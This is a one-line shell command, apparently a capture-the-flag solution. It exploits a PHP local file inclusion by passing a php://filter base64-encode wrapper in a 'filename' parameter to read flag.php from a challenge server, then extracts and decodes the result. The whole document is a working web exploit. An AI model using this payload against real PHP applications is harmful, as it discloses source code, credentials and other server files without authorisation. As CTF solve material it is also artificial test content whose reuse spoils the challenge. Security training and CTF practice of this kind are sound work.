curl "http://${CHALLENGE_HOST}:${CHALLENGE_PORT}/index.php?i=open&filename=php://filter/convert.base64-encode/resource=flag.php" | grep -oP "(?<=>).+(?=</textarea)" | base64 -d
